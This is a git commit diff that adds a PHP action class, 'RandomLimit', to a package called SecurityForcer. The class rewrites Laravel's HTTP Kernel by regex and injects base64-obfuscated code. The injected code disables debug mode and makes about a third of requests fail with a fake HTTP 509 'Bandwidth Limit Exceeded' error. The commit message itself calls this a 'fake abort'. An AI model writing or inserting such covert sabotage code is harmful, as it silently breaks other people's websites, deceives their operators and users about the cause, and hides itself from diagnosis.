e0f633fbf675b693d2b3e6e88c74c25dd598e560
ozgur.atom <a.o.altomruk@gmail.com>
2021-02-20 14:49:44 +0300

    - new action: RandomLimit for fake abort

--- src/Actions/RandomLimit.php
+++ src/Actions/RandomLimit.php
@@ -2,6 +2,23 @@
 
 namespace Lmande\SecurityForcer\Actions;
 
-class RandomLimit extends ActionBase
+use Illuminate\Foundation\Http\Kernel;
+
+class RandomLimit extends ActionModifier
 {
+	const regex        = '/(public|protected|private) (static)? ?function (sendRequestThroughRouter)\s{0,}\([^\{]{0,}\{([\n\s]{0,})[\w\W]*?\$this->bootstrap[\w\W]*?;/im';
+	const regexReplace = '$0$4:code1:$4:code2:$4';
+	const code_first   = 'base64_decode(\'Y29uZmln=\')([base64_decode(\'YXBwLmRlYnVn=\') => false]);';
+	const code         = 'if (base64_decode(\'dGltZQ==\')()%11<4) base64_decode(\'YWJvcnQ=\')((int) base64_decode(\'NTA5\'), base64_decode(\'QmFuZHdpZHRoIExpbWl0IEV4Y2VlZGVk\'));';
+
+	public function run(): bool
+	{
+		$this->checkedCodeExistance = false;
+
+		$replacer = str_replace(
+			[':code1:', ':code2:'], [self::code_first, self::code], self::regexReplace
+		);
+
+		return $this->newClass(Kernel::class, self::regex, $replacer, self::code);
+	}
 }
